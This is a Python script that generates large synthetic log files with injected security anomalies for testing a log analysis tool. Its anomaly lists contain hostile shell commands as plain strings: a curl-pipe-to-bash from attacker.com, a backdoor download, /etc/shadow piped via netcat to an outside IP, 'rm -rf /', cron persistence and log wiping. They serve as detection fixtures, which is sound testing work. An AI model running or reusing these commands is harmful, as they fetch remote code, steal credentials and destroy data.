#!/usr/bin/env python3
"""
generate_sample_log.py — GB-Scale Stress-Test Log Generator
============================================================
Generates 1–5 GB log files with realistic multi-format entries and
embedded security anomalies for CLI analysis tool testing.

Supported formats  : syslog | apache | nginx | json | windows | mixed
Anomaly categories : bruteforce | escalation | tampering | sensitive |
                     unauthorized | crash | exfil | lateral_movement

Usage examples
--------------
  # 1 GB mixed log, default anomaly rate
  python generate_sample_log.py -s 1

  # 3 GB apache-format, 10 % anomaly density, 5 deliberate gaps
  python generate_sample_log.py -s 3 -f apache --anomaly-rate 0.10 --gaps 5

  # 500 MB JSON log, only bruteforce + escalation anomalies
  python generate_sample_log.py -s 0.5 -f json --types bruteforce escalation

  # 2 GB mixed, write progress every 5 s, save to /tmp/big.log
  python generate_sample_log.py -s 2 -o /tmp/big.log --progress-interval 5
"""

import argparse
import gzip
import json
import os
import random
import sys
import time
from datetime import datetime, timedelta
from pathlib import Path

# ─────────────────────────────────────────────────────────────
#  Constants
# ─────────────────────────────────────────────────────────────
WRITE_BUFFER   = 64 * 1024 * 1024   # 64 MB write buffer
LINES_PER_TICK = 5_000              # lines generated per loop iteration

_SENSITIVE_FILES = [
    "/etc/shadow", "/etc/passwd", "/root/.ssh/authorized_keys",
    "/var/lib/mysql", "/etc/sudoers", "/etc/ssl/private/server.key",
    "/home/admin/.aws/credentials", "/var/backups/shadow.bak",
    "/etc/crontab", "/root/.bash_history",
]
_UNAUTHORIZED_CMDS = [
    "rm -rf /", "nmap -sS 10.0.0.0/24", "netcat -l -p 4444",
    "curl http://attacker.com/exploit.sh | bash",
    "python3 -c \"import pty; pty.spawn('/bin/bash')\"",
    "wget http://185.220.101.35/backdoor -O /tmp/.x && chmod +x /tmp/.x",
    "cat /etc/shadow | nc 45.155.205.233 9001",
    "crontab -l | { cat; echo '*/5 * * * * /tmp/.x'; } | crontab -",
]
_ADMIN_USERS     = ["root", "admin", "skyler", "sysop", "devops", "ubuntu"]
_NORMAL_USERS    = ["jsmith", "bwilliams", "tlee", "aparker", "mgarcia",
                    "dkhan", "rsingh", "lwang", "cfoster", "ndiaye"]
_SERVICES        = ["apache2", "mysql", "docker", "ssh", "nginx", "redis",
                    "postgresql", "cron", "auditd", "rsyslog"]
_HTTP_METHODS    = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"]
_HTTP_STATUS_OK  = [200, 200, 200, 200, 201, 204, 301, 304]
_HTTP_STATUS_ERR = [400, 401, 403, 404, 429, 500, 502, 503]
_WEB_PATHS       = [
    "/", "/index.html", "/api/v1/users", "/api/v1/orders",
    "/static/app.js", "/favicon.ico", "/health", "/metrics",
    "/admin/login", "/wp-login.php", "/phpmyadmin/", "/.env",
    "/api/v1/auth/token", "/dashboard", "/api/v2/data",
]
_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "curl/7.88.1",
    "python-requests/2.31.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "sqlmap/1.7.8#stable",
    "Nikto/2.1.6",
    "masscan/1.3 (https://github.com/robertdavidgraham/masscan)",
]

# Realistic subnets — mix of internal, CDN, and known-bad
_INTERNAL_IPS = [f"10.0.{r}.{h}" for r in range(1, 5) for h in range(1, 50)]
_CDN_IPS      = [f"104.{r}.{h}.{t}" for r in range(16, 32)
                 for h in range(1, 10) for t in range(1, 10)]
_MALICIOUS_IPS = [
    "194.26.135.21", "185.220.101.35", "45.155.205.233",
    "91.108.4.22",   "198.98.56.149",  "103.251.167.20",
    "62.102.148.69", "195.54.160.149", "5.188.210.227",
    "185.234.219.10","178.175.148.42", "89.234.157.254",
]
_ALL_IPS = _INTERNAL_IPS + _CDN_IPS[:50]

_WIN_EVENT_IDS = {
    4624: "An account was successfully logged on",
    4625: "An account failed to log on",
    4648: "A logon was attempted using explicit credentials",
    4656: "A handle to an object was requested",
    4663: "An attempt was made to access an object",
    4688: "A new process has been created",
    4698: "A scheduled task was created",
    4720: "A user account was created",
    4732: "A member was added to a security-enabled local group",
    4776: "The domain controller attempted to validate credentials",
    7045: "A new service was installed in the system",
}
_WIN_SUSPICIOUS_IDS = {
    4625: "An account failed to log on",
    4688: "A new process has been created",
    4698: "A scheduled task was created",
    4720: "A user account was created",
    4732: "A member was added to a security-enabled local group",
    7045: "A new service was installed in the system",
}

_HOSTNAMES = ["server-01", "web-prod-02", "db-primary", "auth-svc", "api-gw-01"]

# ─────────────────────────────────────────────────────────────
#  Timestamp helpers
# ─────────────────────────────────────────────────────────────
def iso_ts(dt: datetime) -> str:
    return dt.isoformat(timespec='milliseconds') + "Z"

def syslog_ts(dt: datetime) -> str:
    return dt.strftime('%b %d %H:%M:%S')

def apache_ts(dt: datetime) -> str:
    return dt.strftime('%d/%b/%Y:%H:%M:%S +0000')

def win_ts(dt: datetime) -> str:
    return dt.strftime('%Y-%m-%d %H:%M:%S')

# ─────────────────────────────────────────────────────────────
#  Normal log-line generators (one per format)
# ─────────────────────────────────────────────────────────────
def normal_syslog(dt: datetime) -> str:
    host = random.choice(_HOSTNAMES)
    user = random.choice(_NORMAL_USERS)
    svc  = random.choice(_SERVICES)
    msgs = [
        f"pam_unix({svc}:session): session opened for user {user}",
        f"systemd[1]: Started {svc}.service - Main Process",
        f"kernel: EXT4-fs ({svc}): mounted filesystem",
        f"CRON[{random.randint(1000,9999)}]: ({user}) CMD (/usr/bin/backup.sh)",
        f"systemd[1]: {svc}.service: Succeeded.",
        f"sshd[{random.randint(10000,99999)}]: Accepted publickey for {user} from "
        f"{random.choice(_INTERNAL_IPS)} port {random.randint(1024,65535)} ssh2",
    ]
    return f"{syslog_ts(dt)} {host} {random.choice(msgs)}"

def normal_apache(dt: datetime) -> str:
    ip     = random.choice(_ALL_IPS)
    method = random.choice(_HTTP_METHODS[:3])          # mostly GETs
    path   = random.choice(_WEB_PATHS[:12])
    status = random.choice(_HTTP_STATUS_OK)
    size   = random.randint(200, 85000)
    ua     = random.choice(_USER_AGENTS[:5])
    return f'{ip} - - [{apache_ts(dt)}] "{method} {path} HTTP/1.1" {status} {size} "-" "{ua}"'

def normal_nginx(dt: datetime) -> str:
    # Nginx uses a slightly different combined log format
    ip     = random.choice(_ALL_IPS)
    method = random.choice(_HTTP_METHODS[:3])
    path   = random.choice(_WEB_PATHS[:12])
    status = random.choice(_HTTP_STATUS_OK)
    size   = random.randint(100, 60000)
    rt     = round(random.uniform(0.001, 0.8), 3)
    ua     = random.choice(_USER_AGENTS[:5])
    return (f'{ip} - - [{apache_ts(dt)}] "{method} {path} HTTP/1.1" '
            f'{status} {size} "-" "{ua}" rt={rt}')

def normal_json(dt: datetime) -> str:
    user = random.choice(_NORMAL_USERS)
    svc  = random.choice(_SERVICES)
    entry = {
        "timestamp":  iso_ts(dt),
        "level":      random.choice(["INFO", "INFO", "INFO", "DEBUG", "WARN"]),
        "service":    svc,
        "host":       random.choice(_HOSTNAMES),
        "user":       user,
        "message":    random.choice([
            "Request processed successfully",
            "Cache hit",
            "Database query executed",
            "Health check passed",
            "Session resumed",
        ]),
        "latency_ms": round(random.uniform(1, 300), 2),
        "request_id": f"{random.randint(10**11, 10**12-1):012x}",
    }
    return json.dumps(entry, separators=(',', ':'))

def normal_windows(dt: datetime) -> str:
    eid  = random.choice(list(_WIN_EVENT_IDS.keys()))
    user = random.choice(_NORMAL_USERS)
    return (f"{win_ts(dt)} EventID={eid} Level=Information "
            f"Source=Microsoft-Windows-Security-Auditing "
            f"User={user} Message=\"{_WIN_EVENT_IDS[eid]}\"")

# ─────────────────────────────────────────────────────────────
#  Anomaly generators (format-aware where useful)
# ─────────────────────────────────────────────────────────────
def anomaly_bruteforce(dt: datetime, fmt: str) -> str:
    ip   = random.choice(_MALICIOUS_IPS)
    user = random.choice(["root", "admin", "postgres", "oracle"])
    port = random.randint(1024, 65535)
    pid  = random.randint(10000, 99999)
    if fmt == "apache":
        # Rapid 401 hits on login endpoint
        ua = random.choice(_USER_AGENTS[6:])        # scanner UAs
        return f'{ip} - - [{apache_ts(dt)}] "POST /api/v1/auth/token HTTP/1.1" 401 45 "-" "{ua}"'
    if fmt == "json":
        return json.dumps({
            "timestamp": iso_ts(dt), "level": "WARN",
            "event": "AUTH_FAILURE", "source_ip": ip,
            "target_user": user, "attempt": random.randint(2, 500),
            "message": "Brute-force login attempt detected",
        }, separators=(',', ':'))
    if fmt == "windows":
        return (f"{win_ts(dt)} EventID=4625 Level=Warning "
                f"Source=Microsoft-Windows-Security-Auditing "
                f"User={user} SourceIP={ip} FailureReason=UnknownUsername "
                f"Message=\"{_WIN_SUSPICIOUS_IDS[4625]}\"")
    return (f"{syslog_ts(dt)} {random.choice(_HOSTNAMES)} "
            f"sshd[{pid}]: Failed password for {user} from {ip} port {port} ssh2")

def anomaly_escalation(dt: datetime, fmt: str) -> str:
    user = random.choice(["guest", "www-data", "temp", "backup"])
    if fmt == "json":
        return json.dumps({
            "timestamp": iso_ts(dt), "level": "CRITICAL",
            "event": "PRIV_ESCALATION", "user": user,
            "target": "root", "method": "sudo",
            "message": "Privilege escalation attempt",
        }, separators=(',', ':'))
    if fmt == "windows":
        return (f"{win_ts(dt)} EventID=4732 Level=Critical "
                f"Source=Microsoft-Windows-Security-Auditing "
                f"User={user} Group=Administrators "
                f"Message=\"{_WIN_SUSPICIOUS_IDS[4732]}\"")
    return (f"{syslog_ts(dt)} {random.choice(_HOSTNAMES)} su: "
            f"pam_unix(su:auth): authentication failure; logname= "
            f"uid=1001 euid=0 tty=pts/1 ruser={user} rhost= user=root")

def anomaly_tampering(dt: datetime, fmt: str) -> str:
    user = random.choice(_ADMIN_USERS)
    cmds = ["history -c", "rm /var/log/auth.log", "shred -u ~/.bash_history",
            "> /var/log/syslog", "rm -rf /var/log/*", "journalctl --rotate && journalctl --vacuum-time=1s"]
    cmd  = random.choice(cmds)
    if fmt == "json":
        return json.dumps({
            "timestamp": iso_ts(dt), "level": "CRITICAL",
            "event": "LOG_TAMPERING", "user": user,
            "command": cmd, "message": "Log deletion/tampering detected",
        }, separators=(',', ':'))
    return (f"{syslog_ts(dt)} {random.choice(_HOSTNAMES)} "
            f"sudo: {user} : TTY=pts/0 ; COMMAND={cmd}")

def anomaly_sensitive(dt: datetime, fmt: str) -> str:
    fpath = random.choice(_SENSITIVE_FILES)
    if fmt in ("apache", "nginx"):
        ip = random.choice(_MALICIOUS_IPS)
        ua = random.choice(_USER_AGENTS[6:])
        return (f'{ip} - - [{apache_ts(dt)}] "GET {fpath} HTTP/1.1" '
                f'403 512 "-" "{ua}"')
    if fmt == "json":
        return json.dumps({
            "timestamp": iso_ts(dt), "level": "CRITICAL",
            "event": "SENSITIVE_FILE_ACCESS", "file": fpath,
            "user": "www-data", "pid": random.randint(1000, 9999),
            "message": "Unauthorized sensitive file access",
        }, separators=(',', ':'))
    return (f"{iso_ts(dt)} [SECURITY] Unauthorized access attempt: "
            f"{fpath} by user 'www-data' (PID: {random.randint(1000,9999)})")

def anomaly_unauthorized(dt: datetime, fmt: str) -> str:
    user = random.choice(_ADMIN_USERS)
    cmd  = random.choice(_UNAUTHORIZED_CMDS)
    if fmt == "json":
        return json.dumps({
            "timestamp": iso_ts(dt), "level": "CRITICAL",
            "event": "UNAUTHORIZED_COMMAND", "user": user,
            "command": cmd, "message": "Dangerous command executed via sudo",
        }, separators=(',', ':'))
    return (f"{syslog_ts(dt)} {random.choice(_HOSTNAMES)} "
            f"sudo: {user} : TTY=pts/2 ; COMMAND={cmd}")

def anomaly_crash(dt: datetime, fmt: str) -> str:
    svc = random.choice(_SERVICES)
    if fmt == "json":
        return json.dumps({
            "timestamp": iso_ts(dt), "level": "ERROR",
            "event": "SERVICE_CRASH", "service": svc,
            "exit_code": "SEGV", "message": f"{svc} crashed with signal 11",
        }, separators=(',', ':'))
    return (f"{syslog_ts(dt)} {random.choice(_HOSTNAMES)} systemd[1]: "
            f"{svc}.service: Main process exited, code=dumped, status=11/SEGV")

def anomaly_exfil(dt: datetime, fmt: str) -> str:
    ip   = random.choice(_MALICIOUS_IPS)
    size = random.randint(50_000_000, 2_000_000_000)
    if fmt in ("apache", "nginx"):
        return (f'{ip} - - [{apache_ts(dt)}] "GET /api/v1/export?full=1 HTTP/1.1" '
                f'200 {size} "-" "python-requests/2.28.0"')
    if fmt == "json":
        return json.dumps({
            "timestamp": iso_ts(dt), "level": "CRITICAL",
            "event": "DATA_EXFILTRATION", "dest_ip": ip,
            "bytes_transferred": size,
            "message": "Large outbound data transfer to external IP",
        }, separators=(',', ':'))
    return (f"{syslog_ts(dt)} {random.choice(_HOSTNAMES)} kernel: "
            f"[UFW BLOCK] OUT=eth0 DST={ip} LEN={size} PROTO=TCP")

def anomaly_lateral(dt: datetime, fmt: str) -> str:
    src = random.choice(_INTERNAL_IPS)
    dst = random.choice(_INTERNAL_IPS)
    if fmt == "json":
        return json.dumps({
            "timestamp": iso_ts(dt), "level": "CRITICAL",
            "event": "LATERAL_MOVEMENT", "src_ip": src, "dst_ip": dst,
            "port": random.choice([22, 445, 3389, 5985]),
            "message": "Unusual internal-to-internal connection",
        }, separators=(',', ':'))
    return (f"{syslog_ts(dt)} {random.choice(_HOSTNAMES)} kernel: "
            f"[UFW ALLOW] IN=eth0 SRC={src} DST={dst} "
            f"PROTO=TCP DPT={random.choice([22,445,3389,5985])}")

ANOMALY_FNS = {
    "bruteforce":       anomaly_bruteforce,
    "escalation":       anomaly_escalation,
    "tampering":        anomaly_tampering,
    "sensitive":        anomaly_sensitive,
    "unauthorized":     anomaly_unauthorized,
    "crash":            anomaly_crash,
    "exfil":            anomaly_exfil,
    "lateral_movement": anomaly_lateral,
}

NORMAL_FNS = {
    "syslog":  normal_syslog,
    "apache":  normal_apache,
    "nginx":   normal_nginx,
    "json":    normal_json,
    "windows": normal_windows,
}

ALL_FORMATS = list(NORMAL_FNS.keys())

# ─────────────────────────────────────────────────────────────
#  Progress display
# ─────────────────────────────────────────────────────────────
def fmt_bytes(n: int) -> str:
    for unit in ("B", "KB", "MB", "GB"):
        if n < 1024:
            return f"{n:.1f} {unit}"
        n /= 1024
    return f"{n:.2f} TB"

def print_progress(written: int, target: int, start: float, last: float,
                   lines: int, anomalies: int) -> float:
    now  = time.time()
    if now - last < 0.5:        # throttle redraws
        return last
    elapsed  = max(now - start, 0.001)
    speed    = written / elapsed
    pct      = min(written / target * 100, 100.0)
    eta      = (target - written) / max(speed, 1)
    bar_w    = 30
    filled   = int(bar_w * pct / 100)
    bar      = "█" * filled + "░" * (bar_w - filled)
    print(
        f"\r  [{bar}] {pct:5.1f}%  "
        f"{fmt_bytes(written):>10} / {fmt_bytes(target)}  "
        f"Speed: {fmt_bytes(int(speed))}/s  "
        f"ETA: {int(eta//60):02d}:{int(eta%60):02d}  "
        f"Lines: {lines:,}  Anomalies: {anomalies:,}",
        end="", flush=True
    )
    return now

# ─────────────────────────────────────────────────────────────
#  Core generator
# ─────────────────────────────────────────────────────────────
def generate(args) -> dict:
    target_bytes  = int(args.size * 1024 ** 3)
    out_path      = Path(args.output)
    anomaly_types = (list(ANOMALY_FNS.keys())
                     if "all" in args.types else args.types)
    formats       = (ALL_FORMATS
                     if args.format == "mixed" else [args.format])

    # Pre-schedule gap positions (as byte offsets)
    gap_every = max(target_bytes // max(args.gaps, 1), 1)
    next_gap  = gap_every

    current_dt = datetime.now() - timedelta(days=args.days_back)

    # Spike windows — 10 % of the time we emit bursts (brute-force simulation)
    spike_active = False
    spike_end    = current_dt

    open_fn = gzip.open if args.compress else open
    mode    = "wt" if args.compress else "w"

    total_lines    = 0
    total_anomalies = 0
    written_bytes  = 0
    injected_gaps  = []

    start_time = time.time()
    last_print = start_time

    print(f"\n  Target : {fmt_bytes(target_bytes)}")
    print(f"  Format : {args.format}")
    print(f"  Output : {out_path}")
    print(f"  Anomaly: {args.anomaly_rate*100:.1f}%  |  Gaps: {args.gaps}  |  Compress: {args.compress}\n")

    with open_fn(out_path, mode, encoding="utf-8",
                 buffering=WRITE_BUFFER) as fh:

        while written_bytes < target_bytes:
            lines_chunk = []

            for _ in range(LINES_PER_TICK):
                # Time progression — small jitter
                jitter = random.randint(1, args.interval)
                current_dt += timedelta(seconds=jitter)

                # Spike logic — simulate brute-force bursts
                if not spike_active and random.random() < 0.0005:
                    spike_active = True
                    spike_end    = current_dt + timedelta(seconds=random.randint(30, 300))
                if spike_active:
                    if current_dt >= spike_end:
                        spike_active = False
                    else:
                        current_dt -= timedelta(seconds=jitter - 0)   # compress time

                # Gap injection (by byte threshold)
                if written_bytes >= next_gap and len(injected_gaps) < args.gaps:
                    gap_sec = args.gap_size + random.randint(-300, 300)
                    current_dt += timedelta(seconds=gap_sec)
                    injected_gaps.append((total_lines + 1, gap_sec))
                    next_gap += gap_every

                # Choose format for this line
                fmt = random.choice(formats)

                # Decide: anomaly or normal?
                is_anomaly = (spike_active or
                              random.random() < args.anomaly_rate)

                if is_anomaly and anomaly_types:
                    atype = random.choice(anomaly_types)
                    line  = ANOMALY_FNS[atype](current_dt, fmt)
                    total_anomalies += 1
                else:
                    line = NORMAL_FNS[fmt](current_dt)

                lines_chunk.append(line)

            chunk_str = "\n".join(lines_chunk) + "\n"
            fh.write(chunk_str)

            written_bytes  += len(chunk_str.encode("utf-8"))
            total_lines    += len(lines_chunk)
            last_print      = print_progress(
                written_bytes, target_bytes, start_time,
                last_print, total_lines, total_anomalies
            )

    # Final newline on progress
    print()

    elapsed = time.time() - start_time
    return {
        "path":       str(out_path),
        "size":       written_bytes,
        "lines":      total_lines,
        "anomalies":  total_anomalies,
        "gaps":       injected_gaps,
        "elapsed_s":  elapsed,
    }

# ─────────────────────────────────────────────────────────────
#  CLI
# ─────────────────────────────────────────────────────────────
def main():
    p = argparse.ArgumentParser(
        description="Generate GB-scale log files for CLI analysis testing.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    p.add_argument("-o", "--output",   default="stress_test.log",
                   help="Output file path (default: stress_test.log)")
    p.add_argument("-s", "--size",     type=float, default=1.0,
                   help="Target file size in GB (default: 1.0)")
    p.add_argument("-f", "--format",   default="mixed",
                   choices=["mixed"] + ALL_FORMATS,
                   help="Log format (default: mixed)")
    p.add_argument("--anomaly-rate",   type=float, default=0.05,
                   help="Fraction of lines that are anomalies 0.0–1.0 (default: 0.05)")
    p.add_argument("--types",          nargs="+",  default=["all"],
                   choices=["all"] + list(ANOMALY_FNS.keys()),
                   help="Anomaly types to inject (default: all)")
    p.add_argument("--gaps",           type=int,   default=10,
                   help="Number of deliberate time gaps (default: 10)")
    p.add_argument("--gap-size",       type=int,   default=3600,
                   help="Base gap duration in seconds (default: 3600)")
    p.add_argument("--interval",       type=int,   default=2,
                   help="Max seconds between normal log lines (default: 2)")
    p.add_argument("--days-back",      type=int,   default=1,
                   help="How many days back to start timestamps (default: 1)")
    p.add_argument("--compress",       action="store_true",
                   help="Write gzip-compressed output (.gz appended if missing)")
    p.add_argument("--progress-interval", type=float, default=1.0,
                   help="Seconds between progress updates (default: 1.0)")
    p.add_argument("--seed",           type=int,   default=None,
                   help="Random seed for reproducible output")

    args = p.parse_args()

    if args.seed is not None:
        random.seed(args.seed)

    if args.compress and not args.output.endswith(".gz"):
        args.output += ".gz"

    if args.size <= 0:
        p.error("--size must be > 0")
    if not (0.0 <= args.anomaly_rate <= 1.0):
        p.error("--anomaly-rate must be between 0.0 and 1.0")

    print("=" * 62)
    print("  GB-Scale Log Generator  —  check-log stress-test suite")
    print("=" * 62)

    stats = generate(args)

    print()
    print("=" * 62)
    print("  DONE")
    print("=" * 62)
    print(f"  File     : {stats['path']}")
    print(f"  Size     : {fmt_bytes(stats['size'])}")
    print(f"  Lines    : {stats['lines']:,}")
    print(f"  Anomalies: {stats['anomalies']:,}  "
          f"({stats['anomalies']/max(stats['lines'],1)*100:.2f} %)")
    print(f"  Gaps     : {len(stats['gaps'])}")
    for line_no, sec in stats["gaps"]:
        print(f"    Line {line_no:>8,}: {sec/60:.1f} min gap")
    print(f"  Time     : {stats['elapsed_s']:.1f} s  "
          f"({fmt_bytes(int(stats['size']/max(stats['elapsed_s'],0.001)))}/s)")
    print()


if __name__ == "__main__":
    main()